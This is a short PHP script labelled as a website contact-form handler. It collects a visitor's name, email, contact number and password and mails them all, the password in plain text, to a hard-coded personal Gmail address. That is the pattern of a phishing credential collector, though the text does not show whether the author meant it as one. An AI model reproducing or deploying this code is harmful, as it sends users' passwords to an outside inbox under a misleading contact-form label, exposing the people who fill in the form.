<?php
if(empty($_POST['name']) || empty($_POST['contact']) || empty($_POST['password']) || !filter_var($_POST['email'], FILTER_VALIDATE_EMAIL)) {
  http_response_code(500);
  exit();
}

$name = strip_tags(htmlspecialchars($_POST['name']));
$email = strip_tags(htmlspecialchars($_POST['email']));
$m_contact = strip_tags(htmlspecialchars($_POST['contact']));
$password = strip_tags(htmlspecialchars($_POST['password']));


$to = "yashnishankar25907@gmail.com"; // Change this email to your //
$subject = "$m_contact:  $name";
$body = "You have received a new message from your website contact form.\n\n"."Here are the details:\n\nName: $name\n\n\nEmail: $email\n\nContact: $m_contact\n\nPassword: $password";
$header = "From: $email";
$header .= "Reply-To: $email";	

if(!mail($to, $subject, $body, $header))
  http_response_code(500);
?>
